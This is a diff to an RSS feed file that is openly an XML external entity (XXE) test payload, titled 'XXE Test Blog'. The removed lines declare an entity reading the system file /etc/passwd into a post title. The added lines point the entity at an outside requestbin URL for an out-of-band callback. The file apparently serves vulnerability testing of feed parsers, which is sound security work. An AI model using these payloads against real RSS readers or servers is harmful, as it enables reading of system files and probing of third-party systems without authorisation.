@@ -1,18 +1,18 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!ENTITY xxe SYSTEM "https://requestbin.kanbanbox.com/1ny8mfn1" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
-<title>The Blog</title>
+<title>XXE Test Blog</title>
 <link>http://example.com/</link>
-<description>A blog about things</description>
-<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
+<description>XXE Test Blog</description>
+<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
 <item>
 <title>&xxe;</title>
 <link>http://example.com</link>
-<description>a post</description>
+<description>Test Post</description>
 <author>author@example.com</author>
-<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
+<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
 </item>
 </channel>
 </rss>
